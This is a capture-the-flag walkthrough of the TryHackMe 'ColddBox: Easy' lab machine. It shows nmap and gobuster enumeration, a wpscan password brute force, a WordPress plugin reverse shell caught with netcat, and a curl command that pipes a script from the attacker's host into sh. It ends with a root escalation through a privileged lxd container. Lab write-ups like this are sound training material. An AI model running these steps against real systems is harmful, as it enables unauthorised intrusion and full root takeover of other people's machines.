> #  ColddBox: Easy
<https://tryhackme.com/room/colddboxeasy>
-------------------------
It is a cool box (literally). So lets start some Hacking …
So lets start with some nmap scan to enumerate which all ports are open.
```bash
$ sudo nmap -T4 -sV -A target > nmap_scan.txt 
```
![1](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/1.png)

So port 80 is open that I already knew by opening the ip in web browser.
Since it was a web page I began directory search to see is there any broken
access control.
```bash
$ sudo gobuster dirb -u target:80 --wordlist /usr/share/wordlists/dirb/small.txt -e -o dir.txt 
```
![2](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/2.png)

There is a ‘/hidden’ directory on the target that is accessible and gave
potential users on the target.

![3](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/3.png)

And since web page is made on wordpress and there is a login page, great
option to bruteforce wordpress login is using wpscan.

```bash
$ sudo wpscan --url http://target/wp-login.php -e u -P /usr/share/wordlist/rockyou.txt 
```
![4](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/4.png)

Bingo!!! we have a password for c0ldd user. After login we have an
admin dashboard.

Lest get a reverse shell on the target using WP plugin. I found this simple
reverse shell script on
<https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell>.

![5](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/5.png)

I started a netcat listener on my machine on port 8000 
```bash 
$ sudo nc -lvnp 8000 
```
and got a reverse shell by activating our plugin and found that www-data
user have very less permissions thus I enumerated the target using
[linpeas.sh]( https://github.com/carlospolop/privilege-escalation-awesome-scripts-suit
e/tree/master/linPEAS ).Download the linpeas.sh file form Github on your
machine,cd to the downloaded directory and start a simple python server on
your machine 
```bash 
$ python3 -m http.server 1234 
``` 
and on target run it using
```bash 
$ curl http://<attackbox_ip>:1234/linpeas.sh | sh 
```
This will directly
run the shell script on the target machine.

![6](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/6.png)

This gave away wp-config.php file that contained password of user _c0ldd_.
To su to _c0ldd_ user we need a stable shell, stablizing shell by this great
one-liner 
```bash 
$ pyhton3 -c ‘import pty;pty.spawn(“/bin/bash”)  $ su c0ldd 
```
and use password _cybersecurity_ to get access. Now cat the user.txt flag in
/home/c0ldd directory 
```bash 
$ cat /home/c0ldd/user.txt 
```

![7](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/7.png)

Hurray!! got the user flag.

##### Now lets get root access.

Linpeas enumeration also gave potential services, users that could be
exploited. Luckly lxd (container service) is present and accessible by _c0ldd_ user.

![8](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/8.png)

Lets exploit this service, Download the vulnerable container image using 
[alpine for lxd](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
cd to download dir and start http server and transfer the file to target machine
using wget.

> Add the image :
```bash 
$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
$ lxc image list -- You can see your new imported image
```
> Create a container and add root path
```bash
$ lxc init alpine privesc -c security.privileged=true
$ lxc list 
$ lxc config device add privesc host-root disk source=/ path=/mnt/root
recursive=true
```
> Execute the container:
```bash
$ lxc start privesc
$ lxc exec privesc /bin/sh
```

As this container is mounted with /root directory we can access root.txt
inside it 
```bash 
$ cat /mnt/root/root.txt 
```

![9](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/9.png)

> With that the we rooted the box.
